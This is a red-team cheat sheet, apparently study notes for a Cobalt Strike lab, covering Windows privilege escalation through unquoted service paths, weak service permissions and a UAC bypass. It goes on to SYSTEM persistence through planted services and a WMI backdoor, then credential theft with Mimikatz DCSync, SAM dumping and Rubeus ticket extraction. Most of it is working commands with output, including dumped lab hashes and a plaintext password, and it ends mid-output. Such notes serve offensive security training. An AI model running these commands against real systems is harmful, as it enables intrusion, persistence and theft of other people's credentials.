---
description: 11/15/2025
---

# Cheat Sheet Part 2

## Host Privilege Escalation

#### Viewing the services installed on a machine

**We can use** <mark style="color:yellow;">services.msc</mark> **or the** <mark style="color:yellow;">sc</mark> **command-line tool (**<mark style="color:$success;">Use Command Prompt here</mark>**):**

```
C:\>sc query

SERVICE_NAME: Appinfo
DISPLAY_NAME: Application Information
        TYPE               : 30  WIN32
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: AudioEndpointBuilder
DISPLAY_NAME: Windows Audio Endpoint Builder
        TYPE               : 30  WIN32
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

**We can also use the `Get-Service` PowerShell cmdlet:**

```
Get-Service | fl
```

### Unquoted Service Paths

{% hint style="info" %}
_An unquoted service path is where the path to the service binary is not wrapped in quotes. Why is that a problem? By itself it's not, but under specific conditions it can lead to an elevation of privilege._
{% endhint %}

#### ENUMERATION: Using WMI to pull a list of every service and the path to its executable

**Use your Beacon terminal here:**

```
run wmic service get name, pathname
```

**We can then see a list of services, the following are the ones vulnerable to the&#x20;**_**Unquoted Service Paths**_**&#x20;privilege escalation vector:**

```
VulnService1       C:\Program Files\Vulnerable Services\Service 1.exe                                         

VulnService2       "C:\Program Files\Vulnerable Services\Service 2.exe"                                       

VulnService3       "C:\Program Files\Vulnerable Services\Service 3.exe"
```

#### What makes it vulnerable?

The fact that particularly <mark style="color:$danger;">`Service 1.exe`</mark> has <mark style="color:yellow;">spaces in the path and is unquoted</mark>.

**When Windows attempts to read the path to this executable, it interprets the space as a terminator. So, it will attempt to execute the following (in order):**

1. `C:\Program.exe`
2. `C:\Program Files\Vulnerable.exe`
3. `C:\Program Files\Vulnerable Services\Service.exe`

_<mark style="color:yellow;">We also need to make sure that we have permissions to write into these paths.</mark>_

{% hint style="info" %}
If we can drop a binary into any of those paths, the service will execute it before the real one.
{% endhint %}

**The PowerShell `Get-Acl` cmdlet will show the permissions of various objects (including files and directories):**

```
beacon> powershell Get-Acl -Path "C:\Program Files\Vulnerable Services" | fl

Path   : Microsoft.PowerShell.Core\FileSystem::C:\Program Files\Vulnerable Services
Owner  : BUILTIN\Administrators
Group  : DEV\Domain Users
Access : BUILTIN\Users Allow  CreateFiles, Synchronize
         NT SERVICE\TrustedInstaller Allow  FullControl
         NT SERVICE\TrustedInstaller Allow  268435456
         NT AUTHORITY\SYSTEM Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  268435456
         BUILTIN\Administrators Allow  FullControl
         BUILTIN\Administrators Allow  268435456
         BUILTIN\Users Allow  ReadAndExecute, Synchronize
         BUILTIN\Users Allow  -1610612736
         CREATOR OWNER Allow  268435456
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  -1610612736
         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES Allow  -1610612736
Audit  : 
Sddl   : O:BAG:DUD:AI(A;;0x100002;;;BU)(A;ID;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;CII
         OID;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;ID;FA;;;SY)(A;OICIIOID;GA;;;SY)(A;I
         D;FA;;;BA)(A;OICIIOID;GA;;;BA)(A;ID;0x1200a9;;;BU)(A;OICIIOID;GXGR;;;BU)(A;OICIIOID;GA;;;CO)(A;ID;0x1200a9;;;A
         C)(A;OICIIOID;GXGR;;;AC)(A;ID;0x1200a9;;;S-1-15-2-2)(A;OICIIOID;GXGR;;;S-1-15-2-2)
```

#### Use SharpUp for this, it's much more streamlined&#x20;

```
execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit UnquotedServicePath

=== SharpUp: Running Privilege Escalation Checks ===

[*] In medium integrity but user is a local administrator- UAC can be bypassed.

[*] Audit mode: running an additional 1 check(s).

=== Services with Unquoted Paths ===
	Service 'VulnService1' (StartMode: Automatic) has executable 'C:\Program Files\Vulnerable Services\Service 1.exe', but 'C:\Program Files\Vulnerable Services\Service' is modifable.



[*] Completed Privesc Checks in 0 second
```

{% hint style="warning" %}
Payloads to abuse services must be specific "service binaries", because they need to interact with the Service Control Manager. When using the "Generate All Payloads" option, these have `svc` in the filename.

&#x20;

It is recommended to use TCP beacons bound to `localhost` only for privilege escalations.
{% endhint %}

#### Planting a service binary Beacon

**In the Beacon:**

```
cd C:\Program Files\Vulnerable Services

ls

upload C:\Payloads\tcp-local_x64.svc.exe # Upload Malicious Service Beacon Binary

mv tcp-local_x64.svc.exe Service.exe # Rename binary to that of the vulnerable service

ls # Confirm successful plant

run sc stop VulnService1

run sc start VulnService1
```

{% hint style="success" %}
**DURING THE EXAM/LAB:** Standard users cannot stop or start services by default, so you would usually need to wait for a computer reboot. This privilege has been granted in the lab for quality of life.
{% endhint %}

**Very important, please read:**

{% hint style="info" %}
When you start the service, you'll see its state will be `START_PENDING`.  If you then check its status with `sc query VulnService1`, you'll see it will be `STOPPED`. &#x20;

This is by design. &#x20;

You will also not see a Beacon appear in the UI automatically. &#x20;

You should see the port you used in your TCP listener configuration (in my case `4444`) is now listening on `127.0.0.1`.
{% endhint %}

**Verifying the port is open:**

```
beacon> run netstat -anp tcp
[11/16 02:36:40] [*] Tasked beacon to run: netstat -anp tcp
[11/16 02:36:43] [+] host called home, sent: 34 bytes
[11/16 02:36:44] [+] job registered with id 5
[11/16 02:36:44] [+] [job 5] received output:

Active Connections

  Proto  Local Address          Foreign Address        State

  TCP    127.0.0.1:4444         0.0.0.0:0              LISTENING

[11/16 02:36:44] [+] job 5 completed
```

<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

#### Restoring Service

**If desired, we can restore the service (simply delete and restart the original service):**

```
del Service.exe

run sc stop VulnService1

run sc start VulnService1
```

### Weak Service Permissions

#### Searching for Modifiable Services

**The output from `SharpUp` shows that `VulnService2` is modifiable:**

```
execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit ModifiableServices

=== Modifiable Services ===

	Service 'VulnService2' (State: Running, StartMode: Auto)
```

{% hint style="info" %}
You may see some exceptions produced by `SharpUp`, simply ignore these.
{% endhint %}

#### Viewing Permissions of Modifiable Services

[This](https://rohnspowershellblog.wordpress.com/2013/03/19/viewing-service-acls/) PowerShell script will print which service rights we have.

```
powershell-import C:\Tools\Get-ServiceAcl.ps1

powershell Get-ServiceAcl -Name VulnService2 | select -expand Access
```

**Output:**

```
ServiceRights     : ChangeConfig, Start, Stop
AccessControlType : AccessAllowed
IdentityReference : NT AUTHORITY\Authenticated Users
IsInherited       : False
InheritanceFlags  : None
PropagationFlags  : None
(...)
```

We see that _**all Authenticated Users**_ have `ChangeConfig`, `Start`, and `Stop` privileges over this service; meaning that we can abuse these weak permissions by changing the binary path.

{% hint style="info" %}
So instead of it running `C:\Program Files\Vulnerable Services\Service 2.exe`, we can have it run something like `C:\Temp\payload.exe`.
{% endhint %}

#### Exploiting Weak Service Permissions

1. **Validate that the current path is: `"C:\Program Files\Vulnerable Services\Service 2.exe"`:**

```
beacon> run sc qc VulnService2
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: VulnService2
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\Vulnerable Services\Service 2.exe"
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : VulnService2
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem
```

2. **Upload a service binary and reconfigure the binary path on the vulnerable service:**

```
beacon> mkdir C:\Temp

beacon> cd C:\Temp

beacon> upload C:\Payloads\tcp-local_x64.svc.exe

beacon> run sc config VulnService2 binPath= C:\Temp\tcp-local_x64.svc.exe

[SC] ChangeServiceConfig SUCCESS
```

<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

3. **Verify that the path has been updated:**

```
beacon> run sc qc VulnService2

[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: VulnService2
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Temp\tcp-local_x64.svc.exe
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : VulnService2
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem
```

4. **Restart the service to execute our malicious binary:**

```
run sc stop VulnService2

run sc start VulnService2

connect localhost 4444
```

<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

**If desired, restore the previous binary path:**

```
beacon> run sc config VulnService2 binPath= \""C:\Program Files\Vulnerable Services\Service 2.exe"\"
[SC] ChangeServiceConfig SUCCESS
```

{% hint style="warning" %}
&#x20;The additional set of escaped quotes is necessary to ensure that the path remains fully quoted, otherwise you could introduce a new unquoted service path vulnerability.
{% endhint %}

### Weak Service Binary Permissions

This is a slight variation of the previous vulnerability but instead of exploiting a vulnerable service, we are exploiting a vulnerable service binary itself.

```
beacon> powershell Get-Acl -Path "C:\Program Files\Vulnerable Services\Service 3.exe" | fl
```

<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

This output shows that `BUILTIN\Users` have <mark style="color:$danger;">Modify</mark> privileges over <mark style="color:$danger;">`Service 3.exe`</mark>.&#x20;

<mark style="color:red;">This allows us to be able to overwrite the binary with something else!</mark>

#### Exploiting Weak Service Binary Permissions

1. **Make sure you back up the binary first:**

```
beacon> download Service 3.exe
[*] started download of C:\Program Files\Vuln Services\Service 3.exe (5120 bytes)
[*] download of Service 3.exe is complete
```

2. **Make a copy of your payload whilst renaming it to `Service3.exe` (do this locally):**

```
PS C:\Payloads> copy "tcp-local_x64.svc.exe" "Service 3.exe"
```

3. **Then attempt to upload it:**

```
beacon> upload C:\Payloads\Service 3.exe
```

{% hint style="success" %}
You may receive an error.

&#x20;This seems like an ambiguous error, but it means the file is already in use.  This makes sense, since the service is running.

```
C:\>net helpmsg 32
The process cannot access the file because it is being used by another process.
```
{% endhint %}

4. **Stop the service binary, upload, restart the service, and connect to `localhost:4444`:**

```
beacon> run sc stop VulnService3
beacon> upload C:\Payloads\Service 3.exe
beacon> ls
[*] Listing: C:\Program Files\Vuln Services\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 5kb      fil     02/23/2021 15:04:13   Service 1.exe
 5kb      fil     02/23/2021 15:04:13   Service 2.exe
 290kb    fil     03/03/2021 11:38:24   Service 3.exe

beacon> run sc start VulnService3
beacon> connect localhost 4444
[+] established link to child beacon: 10.10.123.102
```

### User Account Control (UAC) Bypass

Beacon has a few built-in UAC bypasses and a few more which are provided via the [Elevate Kit](https://github.com/cobalt-strike/ElevateKit) (this has already been pre-loaded into Cobalt Strike for your convenience). &#x20;

These are exposed via the `elevate` command.

```
beacon> elevate uac-schtasks tcp-local
[*] Tasked Beacon to run windows/beacon_bind_tcp (127.0.0.1:4444) in a high integrity context
[+] established link to child beacon: 10.10.123.102
```

**This results in:**

<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

## Elevated Host Persistence

{% hint style="success" %}
This is what to do after you have elevated your privileges on a host.
{% endhint %}

we've elevated our privileges on a host, we can also add persistence mechanisms to maintain SYSTEM access.  This allows to maintain elevated access to a machine without having to exploit a vulnerability again (because it may be patched or fixed at a later date).

_**For these methods to work, you must be running in a high integrity Beacon.**_

{% hint style="warning" %}
Remember that SYSTEM processes cannot authenticate to the web proxy, so we can't use HTTP Beacons. Use P2P or DNS Beacons instead.
{% endhint %}

### Windows Services

{% hint style="danger" %}
Remember, this must be done in a `SYSTEM`-privileged session.
{% endhint %}

**We can create our own service so that we don't impact existing services and break legitimate ones:**

```
beacon> cd C:\Windows
beacon> upload C:\Payloads\tcp-local_x64.svc.exe
beacon> mv tcp-local_x64.svc.exe legit-svc.exe

beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t service -c "C:\Windows\legit-svc.exe" -n "legit-svc" -m add

[*] INFO: Adding service persistence
[*] INFO: Command: C:\Windows\legit-svc.exe
[*] INFO: Command Args: 
[*] INFO: Service Name: legit-svc

[+] SUCCESS: Service persistence added
```

{% hint style="info" %}
This will create a new service in a `STOPPED` state, but with the `START_TYPE` set to `AUTO_START`. &#x20;

**This means the service won't run until the machine is rebooted.** &#x20;

When the machine starts, so will the service, and it will be waiting for a connection.
{% endhint %}

* If you try this right away without rebooting, it will not work, the system must be restarted

**Once restarted:**

```
beacon> connect localhost 4444
```

<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

### WMI Event Subscriptions

**Remember, persistence via WMI events can be achieved by leveraging the following three classes:**

1. `EventConsumer`
2. `EventFilter`
3. `FiltterToConsumerBinding`

An `EventConsumer` is the action that we want to perform, in this case, we can execute a payload.

An `EventFilter` is a trigger we can act upon.

* Any arbitrary WMI query can be used as a filter which provides practically unlimited options (e.g. process start, when a user logs in, when a USB device is inserted, or at a certain time/date)

The `FilterToConsumerBinding` simply links an `EventConsumer` and `EventFilter` together.

[PowerLurk](https://github.com/Sw4mpf0x/PowerLurk) is a PowerShell tool for building these WMI events.&#x20;

#### Uploading DNS Payload to Windows Directory & Create WMI Event Subscription

**Here, we can upload a DNS payload into the Windows directory, import `PowerLurk.ps1` and create a new WMI event subscription that will execute it whenever `notepad` is started:**

```
beacon> cd C:\Windows
beacon> upload C:\Payloads\dns_x64.exe
beacon> powershell-import C:\Tools\PowerLurk.ps1
beacon> powershell Register-MaliciousWmiEvent -EventName WmiBackdoor -PermanentCommand "C:\Windows\dns_x64.exe" -Trigger ProcessStart -ProcessName notepad.exe
```

{% hint style="info" %}
Once `notepad.exe` is executing on the victim workstation, we will get a Beacon back to our TeamServer.
{% endhint %}

#### View Classes Afterwards

Open the new Beacon Terminal and use `checkin` and you will obtain the Beacon session.

<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

**We can use:**

```
Get-WmiEvent -Name WmiBackdoor
```

If desired, the backdoor can be removed with `Get-WmiEvent -Name WmiBackdoor | Remove-WmiObject`.

## Obtaining Credential Material

{% hint style="info" %}
Once elevated on a machine, we can obtain credential material for other users who are authenticated.

Credentials can come in the form of plaintext (username/password), hashes, (NTLM, AES, DCC, NetNTLM, etc), and Kerberos tickets.

Here, we will review how to dump credentials in various formats.
{% endhint %}

### Beacon + Mimikatz

Cobalt Strike has built-in version of Mimikatz that we can use to extract various credentials of all types.

{% hint style="info" %}
Remember, each time we execute Mimikatz in Beacon, a new temporary process is launched and then destroyed, meaning we can't run two related commands in a row.

However, we can "chain" together multiple commands using a `;`.
{% endhint %}

#### Chaining together multiple commands with Beacon Mimikatz

```
beacon> mimikatz token::elevate ; lsadump::sam 
```

**This results in:**

```
Token Id  : 0
User name : 
SID name  : NT AUTHORITY\SYSTEM

556	{0;000003e7} 1 D 24520     	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,21p)	Primary
 -> Impersonated !
 * Process Token : {0;000003e7} 0 D 3250376   	NT AUTHORITY\SYSTEM	S-1-5-18	(40g,28p)	Primary
 * Thread Token  : {0;000003e7} 1 D 3298296   	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,21p)	Impersonation (Delegation)
Domain : WKSTN-2
SysKey : b9dc7de8b1972237bbbd7f82d970f79a
Local SID : S-1-5-21-2281971671-4135076198-2136761646

SAMKey : b0664279732686cfbb4b788c078fea82

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: fc525c9683e8fe067095ba2ddc971889
    lm  - 0: 91b6e660bcac036ae7ab67a3d383bc82
    ntlm- 0: fc525c9683e8fe067095ba2ddc971889

(...)
```

#### Mimikatz Beacon Command Modifiers

<mark style="color:yellow;">`!`</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">elevates Beacon to</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">`SYSTEM`</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">before running the given command</mark>.

* Useful in situations where you're running in high-integrity but need to impersonate `SYSTEM`
* e.g. `!` is a direct replacement for `token::elevate`

**A good use case is:**

```
mimikatz !lsadump::sam
```

* This is the same command ran before!
* So<mark style="color:$success;">, use this!</mark>

<mark style="color:yellow;">The</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">`@`</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">impersonates Beacon's thread token</mark>, this is useful for interacting with a remote system such as with `dcsync`, when Mimikatz needs to communicate with a remote Domain Controller.

#### Impersonation Primitives

**When needing to impersonate a user:**

**For example:**

* `make_token`
* `steal_token`

```
[11/16 23:34:07] beacon> getuid
[11/16 23:34:07] [*] Tasked beacon to get userid
[11/16 23:34:08] [+] host called home, sent: 8 bytes
[11/16 23:34:08] [*] You are DEV\bfarmer
[11/16 23:34:24] beacon> make_token DEV\nlamb F3rrari
[11/16 23:34:24] [*] Tasked beacon to create a token for DEV\nlamb
[11/16 23:34:28] [+] host called home, sent: 35 bytes
[11/16 23:34:28] [+] Impersonated DEV\nlamb (netonly)
[11/16 23:34:37] beacon> mimikatz @lsadump::dcsync /user:DEV\krbtgt
[11/16 23:34:37] [*] Tasked beacon to run mimikatz's @lsadump::dcsync /user:DEV\krbtgt command
[11/16 23:34:38] [+] host called home, sent: 814407 bytes
[11/16 23:34:40] [+] job registered with id 2
[11/16 23:34:40] [+] [job 2] received output:
[DC] 'dev.cyberbotic.io' will be the domain
[DC] 'dc-2.dev.cyberbotic.io' will be the DC server
[DC] 'DEV\krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   : 
Password last change : 8/15/2022 4:01:04 PM
Object Security ID   : S-1-5-21-569305411-121244042-2357301523-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 9fb924c244ad44e934c390dc17e02c3d
    ntlm- 0: 9fb924c244ad44e934c390dc17e02c3d
    lm  - 0: 207d5e08551c51892309c0cf652c353b

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 550703b3096dce5b5bdc9b735b79ee30

* Primary:Kerberos-Newer-Keys *
    Default Salt : DEV.CYBERBOTIC.IOkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e
      aes128_hmac       (4096) : 6fb62ed56c7de778ca5e4fe6da6d3aca
      des_cbc_md5       (4096) : 629189372a372fda

* Primary:Kerberos *
    Default Salt : DEV.CYBERBOTIC.IOkrbtgt
    Credentials
      des_cbc_md5       : 629189372a372fda

* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest *
    01  82d27e18e5a51b359151719075b8efe6
    02  cacfaa14338412f71c5fc49ab4e1d50f
    03  a7ec666072cde603a927ed8ac683c337
    04  82d27e18e5a51b359151719075b8efe6
    05  cacfaa14338412f71c5fc49ab4e1d50f
    06  9e5eb5ea22776f75944637a664825a15
    07  82d27e18e5a51b359151719075b8efe6
    08  c723218f35f1568e2916d31e9bf9a7bf
    09  c723218f35f1568e2916d31e9bf9a7bf
    10  8131eb31cbeb570d96532ae55dbfa418
    11  1481ee3e83e68c4a4568e05758f01780
    12  c723218f35f1568e2916d31e9bf9a7bf
    13  2a730dd5bcc9b3561acfc500d6e855d3
    14  1481ee3e83e68c4a4568e05758f01780
    15  098e6f209b48d9d3338075ae91a37d44
    16  098e6f209b48d9d3338075ae91a37d44
    17  83834e22cfe70b6d2e17612840873048
    18  0542f8bf328626961ece6ffe2f7e104b
    19  c056ce79490f266b9379e9777fa482a0
    20  70850aab87c42c75b60f8084c2c19901
    21  7c4c9dc2a43a232fec42280344fdce23
    22  7c4c9dc2a43a232fec42280344fdce23
    23  6cd9bcf9e63591df5d18f9de3c972af5
    24  73a23dbb97eac22f5075dc9781d7721b
    25  73a23dbb97eac22f5075dc9781d7721b
    26  8ae72fdbb2e6cea2b017c90856891cad
    27  a6dc866ec7b1ccdce86cea695c74ccaf
    28  87664d84ea3a2993101d13f2b2825a9e
    29  bd839cda643ebdb4e8974ac010270395


[11/16 23:34:45] [+] job 2 completed
```

{% hint style="info" %}
Be sure to run these commands right after the impersonation, sometimes it will time out and the `lsadump` command must be ran immediately after forging the impersonation token for `dcsync` to work properly.
{% endhint %}

### NTLM Hashes

The `sekurlsa::logonpasswords` Mimikatz module is infamous for being able to "dump plaintext passwords from memory".

{% hint style="warning" %}
This command requires elevated privileges.
{% endhint %}

```
beacon> mimikatz !sekurlsa::logonpasswords

# Or we can use the short-hand command for this same command

beacon> logonpasswords
```

{% hint style="success" %}
This will allow us to retrieve NTLM hashes which is useful for pairing with _**Pass the Hash**_ or even cracking the password to recover the plaintext.
{% endhint %}

### Kerberos Encryption Keys

#### Dump Kerberos encryption keys of currently logged on users

```
mimikatz sekurlsa::ekeys
```

{% hint style="warning" %}
This command requires elevated privileges.
{% endhint %}

We can take these keys and abuse them in a variety of Kerberos abuse scenarios.

{% hint style="warning" %}
There is a [known issue](https://github.com/gentilkiwi/mimikatz/issues/314) where Mimikatz may incorrectly label all of the hashes as `des_cbc_md4`.\


In this case, the AES256 key is the one we want.  These hashes are not automatically populated into the Credential data model, but they can be added manually via _**View > Credentials > Add**_.

<mark style="color:$danger;">I LITERALLY RAN INTO THIS DURING THE LAB BE WARNED.</mark>
{% endhint %}

### Security Account Manager (SAM)

The SAM database holds the NTLM hashes of local accounts only.

#### Extracting SAM NTLM Hashes of Local Accounts

{% hint style="warning" %}
This command requires elevated privileges.
{% endhint %}

```
mimikatz lsadump::sam
```

{% hint style="info" %}
If a common local administrator account is being used with the same password across an entire environment, this can make it very trivial to move laterally.
{% endhint %}

### Domain Cached Credentials (DCC)

DCC was designed where domain creds are required to logon to a machine even when it is disconnected from the Domain (e.g. roaming laptops).

{% hint style="info" %}
These local device caches the domain credentials so authentication can happen locally, but these can be extracted and cracked offline to recover plaintext credentials.
{% endhint %}

Since the outputted hash format is not NTLM-based, it cannot be used with PTH. So, we must crack them offline.

The `lsadump::cache` Mimikatz module can extract these from `HKLM\SECURITY`.

```
beacon> mimikatz !lsadump::cache
```

#### Cracking

To crack these with [hashcat](https://hashcat.net/hashcat/), we need to transform them into the expected format. The [example hashes page](https://hashcat.net/wiki/doku.php?id=example_hashes) shows us it should be <mark style="color:yellow;">`$DCC2$<iterations>#<username>#<hash>`</mark>.

{% hint style="warning" %}
DCC is orders of magnitude slower to crack than NTLM.
{% endhint %}

### Extracting Kerberos Tickets

#### Rubeus

&#x20;[Rubeus](https://github.com/GhostPack/Rubeus) is a C# tool designed for Kerberos interaction and abuses, using legitimate Windows APIs.

#### List all Kerberos Tickets in current elevated logon session&#x20;

```
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
  
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2 


Action: Triage Kerberos Tickets (All Users)

[*] Current LUID    : 0x992f2f

 ------------------------------------------------------------------------------------------------------------------- 
 | LUID     | UserName                     | Service                                       | EndTime               |
 ------------------------------------------------------------------------------------------------------------------- 
 | 0x992f2f | nlamb @ DEV.CYBERBOTIC.IO    | krbtgt/DEV.CYBERBOTIC.IO                      | 11/19/2025 9:49:30 AM |
 | 0x992f2f | nlamb @ DEV.CYBERBOTIC.IO    | ldap/dc-2.dev.cyberbotic.io                   | 11/19/2025 9:49:30 AM |
 | 0x55120f | bfarmer @ DEV.CYBERBOTIC.IO  | krbtgt/DEV.CYBERBOTIC.IO                      | 11/19/2025 8:57:36 AM |
 | 0x55120f | bfarmer @ DEV.CYBERBOTIC.IO  | ldap/dc-2.dev.cyberbotic.io/dev.cyberbotic.io | 11/19/2025 8:57:36 AM |
 | 0x55120f | bfarmer @ DEV.CYBERBOTIC.IO  | cifs/dc-2.dev.cyberbotic.io                   | 11/19/2025 8:57:36 AM |
 | 0x5511d0 | bfarmer @ DEV.CYBERBOTIC.IO  | krbtgt/DEV.CYBERBOTIC.IO                      | 11/19/2025 8:57:36 AM |
 | 0x5511d0 | bfarmer @ DEV.CYBERBOTIC.IO  | HTTP/scm-1.cyberbotic.io                      | 11/19/2025 8:57:36 AM |
 | 0x5511d0 | bfarmer @ DEV.CYBERBOTIC.IO  | cifs/dc-1.cyberbotic.io/cyberbotic.io         | 11/19/2025 8:57:36 AM |
 | 0x5511d0 | bfarmer @ DEV.CYBERBOTIC.IO  | ldap/dc-1.cyberbotic.io/cyberbotic.io         | 11/19/2025 8:57:36 AM |
 | 0x5511d0 | bfarmer @ DEV.CYBERBOTIC.IO  | LDAP/dc-2.dev.cyberbotic.io/dev.cyberbotic.io | 11/19/2025 8:57:36 AM |
 | 0x84e75  | jking @ DEV.CYBERBOTIC.IO    | krbtgt/DEV.CYBERBOTIC.IO                      | 11/19/2025 7:58:50 AM |
 | 0x3e4    | wkstn-2$ @ DEV.CYBERBOTIC.IO | krbtgt/DEV.CYBERBOTIC.IO                      | 11/19/2025 7:57:46 AM |
 | 0x3e4    | wkstn-2$ @ DEV.CYBERBOTIC.IO | cifs/dc-2.dev.cyberbotic.io                   | 11/19/2025 7:57:46 AM |
 | 0x3e4    | wkstn-2$ @ DEV.CYBERBOTIC.IO | ldap/dc-2.dev.cyberbotic.io/dev.cyberbotic.io | 11/19/2025 7:57:46 AM |
 | 0x3e7    | wkstn-2$ @ DEV.CYBERBOTIC.IO | krbtgt/CYBERBOTIC.IO                          | 11/19/2025 7:57:48 AM |
 | 0x3e7    | wkstn-2$ @ DEV.CYBERBOTIC.IO | HTTP/scm-1.cyberbotic.io                      | 11/19/2025 7:57:48 AM |
 | 0x3e7    | wkstn-2$ @ DEV.CYBERBOTIC.IO | cifs/dc-2.dev.cyberbotic.io/dev.cyberbotic.io | 11/19/2025 7:57:48 AM |
 | 0x3e7    | wkstn-2$ @ DEV.CYBERBOTIC.IO | cifs/dc-1.cyberbotic.io/cyberbotic.io         | 11/19/2025 7:57:48 AM |
 | 0x3e7    | wkstn-2$ @ DEV.CYBERBOTIC.IO | ldap/dc-1.cyberbotic.io/cyberbotic.io         | 11/19/2025 7:57:48 AM |
 | 0x3e7    | wkstn-2$ @ DEV.CYBERBOTIC.IO | WKSTN-2$                                      | 11/19/2025 7:57:48 AM |
 | 0x3e7    | wkstn-2$ @ DEV.CYBERBOTIC.IO | LDAP/dc-2.dev.cyberbotic.io                   | 11/19/2025 7:57:48 AM |
 | 0x3e7    | wkstn-2$ @ DEV.CYBERBOTIC.IO | ldap/dc-2.dev.cyberbotic.io/dev.cyberbotic.io | 11/19/2025 7:57:48 AM |
 -------------------------------------------------------------------------------------------------------------------
```

#### Targeting a specific user from obtained dump of Kerberos Tickets

{% hint style="info" %}
This will only allow us to target/dump Kerberos tickets of _**logged on**_ users
{% endhint %}

**Remember:** each user has their own logon session. This is represented by a LUID (Locally Unique Identifier).

In this example, we will grab the LUID of `bfarmer`, `0x1109b4`.

{% hint style="info" %}
Tickets for service name `krbtgt` are Ticket Granting Tickets (TGTs) and others are Ticket Granting Service Tickets (TGS).
{% endhint %}

#### Dumping Tickets and extracting them from memory

**For example, if we only wanted the TGT for `bfarmer`, we can do:**

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x84e75 /service:krbtgt /nowrap

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2 


Action: Dump Kerberos Ticket Data (All Users)

[*] Target service  : krbtgt
[*] Target LUID     : 0x84e75
[*] Current LUID    : 0xa292fa

  UserName                 : jking
  Domain                   : DEV
  LogonId                  : 0x84e75
  UserSID                  : S-1-5-21-569305411-121244042-2357301523-1105
  AuthenticationPackage    : Kerberos
  LogonType                : Batch
  LogonTime                : 11/18/2025 9:58:48 PM
  LogonServer              : DC-2
  LogonServerDNSDomain     : DEV.CYBERBOTIC.IO
  UserPrincipalName        : jking@cyberbotic.io


    ServiceName              :  krbtgt/DEV.CYBERBOTIC.IO
    ServiceRealm             :  DEV.CYBERBOTIC.IO
    UserName                 :  jking
    UserRealm                :  DEV.CYBERBOTIC.IO
    StartTime                :  11/18/2025 9:58:50 PM
    EndTime                  :  11/19/2025 7:58:50 AM
    RenewTill                :  11/25/2025 9:58:50 PM
    Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
    KeyType                  :  aes256_cts_hmac_sha1
